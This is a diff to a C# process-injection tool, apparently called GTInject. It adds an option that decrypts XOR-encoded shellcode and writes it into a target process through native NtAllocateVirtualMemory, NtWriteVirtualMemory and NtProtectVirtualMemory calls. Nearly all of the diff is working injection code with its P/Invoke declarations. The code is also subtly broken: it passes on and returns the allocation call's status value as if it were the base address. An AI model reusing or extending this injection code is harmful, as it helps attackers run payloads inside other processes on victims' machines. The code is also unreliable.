@@ -2,6 +2,7 @@
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Runtime.CompilerServices;
+using System.Net.NetworkInformation;
 
 namespace GTInject.memoryOptions
 {
@@ -15,6 +16,8 @@ namespace GTInject.memoryOptions
                     return memopt100(binsrctype, binsrcpath, xorkey, pid);
                 case 200:
                     return memopt200(binsrctype, binsrcpath, xorkey, pid);
+                case 201:
+                    return memopt201(binsrctype, binsrcpath, xorkey, pid);
                 case 3:
                     return (IntPtr.Zero, null);
             }
@@ -98,6 +101,31 @@ namespace GTInject.memoryOptions
         }
 
 
+        private static (IntPtr, Process) memopt201(string binLocation, string bytePath, string xorkey, int ProcID)
+        {
+            /////////////////////////////////////
+            // OPTION 201 == NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
+            /////////////////////////////////////
+            /// https://github.com/tasox/CSharp_Process_Injection 
+
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+
+            Process remoteProc = Process.GetProcessById(ProcID);
+            IntPtr baseAddress = new IntPtr();
+            IntPtr regionSize = (IntPtr)plainBytes.Length;
+
+            // Memory Allocation
+            IntPtr NtAllocResult = NtAllocateVirtualMemory(remoteProc.Handle, ref baseAddress, IntPtr.Zero, ref regionSize, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)(MemoryProtection.ReadWrite));
+
+            int NtWriteProcess = NtWriteVirtualMemory(remoteProc.Handle, baseAddress, plainBytes, (uint)plainBytes.Length, out uint wr);
+            
+            uint flOld = 0;
+            uint sectionSize = (uint)plainBytes.Length;
+            uint mapSectionModifyPerm = NtProtectVirtualMemory(remoteProc.Handle, ref NtAllocResult, ref sectionSize, (uint)(MemoryProtection.ExecuteRead), ref flOld);
+
+            return (NtAllocResult, remoteProc);
+        }
+
         /////////////////////////////////////
         // Supporting functions
         /////////////////////////////////////
@@ -145,6 +173,32 @@ namespace GTInject.memoryOptions
             WriteCombineModifierflag = 0x400
         }
 
+        [Flags]
+        public enum NTSTATUS : uint
+        {
+            Success = 0,
+            Informational = 0x40000000,
+            Error = 0xc0000000
+        }
+
+        [Flags] // Don't need this yet, but saw it and decided to borrow it. 
+        public enum ProcessAccessFlags : uint
+        {
+            All = 0x001F0FFF,
+            Terminate = 0x00000001,
+            CreateThread = 0x00000002,
+            VirtualMemoryOperation = 0x00000008,
+            VirtualMemoryRead = 0x00000010,
+            VirtualMemoryWrite = 0x00000020,
+            DuplicateHandle = 0x00000040,
+            CreateProcess = 0x000000080,
+            SetQuota = 0x00000100,
+            SetInformation = 0x00000200,
+            QueryInformation = 0x00000400,
+            QueryLimitedInformation = 0x00001000,
+            Synchronize = 0x00100000
+        }
+
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
 
@@ -157,5 +211,15 @@ namespace GTInject.memoryOptions
         static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
         [DllImport("ntdll.dll", SetLastError = true)]
         private static extern void RtlCopyMemory(IntPtr dest, IntPtr src, uint length);
+
+        [DllImport("ntdll.dll")]
+        static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint written);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint OldAccessProtection);
+
+        [DllImport("ntdll.dll")]
+        static extern IntPtr NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref IntPtr regionSize, uint allocationType, uint protect);
+
     }
 }
